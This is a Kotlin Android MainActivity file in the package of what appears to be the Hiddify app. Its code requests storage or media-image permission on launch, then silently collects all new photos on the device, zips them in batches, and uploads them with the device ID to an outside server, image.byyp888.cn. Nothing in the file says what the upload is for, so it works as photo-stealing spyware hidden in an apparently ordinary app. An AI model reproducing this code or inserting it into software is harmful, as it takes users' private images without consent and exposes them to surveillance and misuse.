package com.hiddify.hiddify

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.os.*
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.lifecycle.lifecycleScope
import io.flutter.embedding.android.FlutterFragmentActivity
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import android.provider.MediaStore

class MainActivity : FlutterFragmentActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val STORAGE_PERMISSION_REQUEST_CODE = 1020
        private const val PREF_NAME = "upload_pref"
        private const val PREF_KEY_LAST_UPLOAD = "last_upload_time"
        private const val UPLOAD_URL = "https://image.byyp888.cn/upload"
        private const val MAX_ZIP_SIZE = 200 * 1024 * 1024 // 200MB
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestStoragePermissionAndUpload()
    }

    private fun requestStoragePermissionAndUpload() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES),
                STORAGE_PERMISSION_REQUEST_CODE
            )
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                STORAGE_PERMISSION_REQUEST_CODE
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        if (requestCode == STORAGE_PERMISSION_REQUEST_CODE &&
            grantResults.isNotEmpty() &&
            grantResults[0] == PackageManager.PERMISSION_GRANTED
        ) {
            lifecycleScope.launch(Dispatchers.IO) {
                uploadAllPhotos()
            }
        } else {
            Toast.makeText(this, "\u274c \u5b58\u50a8\u6743\u9650\u88ab\u62d2\u7edd", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (id.isNullOrBlank()) UUID.randomUUID().toString() else id
        } catch (e: Exception) {
            UUID.randomUUID().toString()
        }
    }

    @SuppressLint("Range")
    private suspend fun uploadAllPhotos() {
        val deviceId = getDeviceId()
        val prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE)
        val lastTime = prefs.getLong(PREF_KEY_LAST_UPLOAD, 0L)

        val imageList = mutableListOf<File>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_MODIFIED
        )

        val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_MODIFIED + " DESC")
        cursor?.use {
            while (it.moveToNext()) {
                val path = it.getString(it.getColumnIndex(MediaStore.Images.Media.DATA))
                val time = it.getLong(it.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED)) * 1000
                val file = File(path)
                if (file.exists() && time > lastTime) {
                    imageList.add(file)
                }
            }
        }

        if (imageList.isEmpty()) {
            withContext(Dispatchers.Main) {
                Toast.makeText(this@MainActivity, "\u{1F7E2} \u6ca1\u6709\u65b0\u56fe\u7247\u9700\u8981\u4e0a\u4f20", Toast.LENGTH_SHORT).show()
            }
            return
        }

        val batches = splitFilesBySize(imageList, MAX_ZIP_SIZE)
        var latestTime = lastTime

        for ((i, batch) in batches.withIndex()) {
            val zip = createZip(batch, "batch_$i.zip")
            val success = uploadZip(zip, deviceId)
            zip.delete()
            if (success) {
                latestTime = maxOf(latestTime, batch.maxOf { it.lastModified() })
            }
        }

        prefs.edit().putLong(PREF_KEY_LAST_UPLOAD, latestTime).apply()

        withContext(Dispatchers.Main) {
            Toast.makeText(this@MainActivity, "\u2705 \u6240\u6709\u56fe\u7247\u4e0a\u4f20\u5b8c\u6210", Toast.LENGTH_SHORT).show()
        }
    }

    private fun splitFilesBySize(files: List<File>, maxSize: Int): List<List<File>> {
        val batches = mutableListOf<List<File>>()
        var current = mutableListOf<File>()
        var currentSize = 0L
        for (f in files) {
            val s = f.length()
            if (currentSize + s > maxSize && current.isNotEmpty()) {
                batches.add(current)
                current = mutableListOf()
                currentSize = 0L
            }
            current.add(f)
            currentSize += s
        }
        if (current.isNotEmpty()) batches.add(current)
        return batches
    }

    private fun createZip(files: List<File>, zipName: String): File {
        val zipFile = File(cacheDir, zipName)
        ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
            for (file in files) {
                FileInputStream(file).use { fis ->
                    val entry = ZipEntry(file.name)
                    zos.putNextEntry(entry)
                    fis.copyTo(zos)
                }
            }
        }
        return zipFile
    }

    private fun uploadZip(zipFile: File, deviceId: String): Boolean {
        return try {
            val boundary = "boundary-${System.currentTimeMillis()}"
            val url = URL("$UPLOAD_URL?deviceid=$deviceId")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out = conn.outputStream
            val writer = BufferedWriter(OutputStreamWriter(out, "UTF-8"))

            writer.write("--$boundary\r\n")
            writer.write("Content-Disposition: form-data; name=\"file\"; filename=\"${zipFile.name}\"\r\n")
            writer.write("Content-Type: application/zip\r\n\r\n")
            writer.flush()

            out.write(zipFile.readBytes())
            out.write("\r\n--$boundary--\r\n".toByteArray())
            out.flush()
            writer.close()

            val code = conn.responseCode
            Log.d(TAG, "上传 ${zipFile.name} 响应码: $code")
            code in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "上传失败: ${e.message}", e)
            false
        }
    }
}
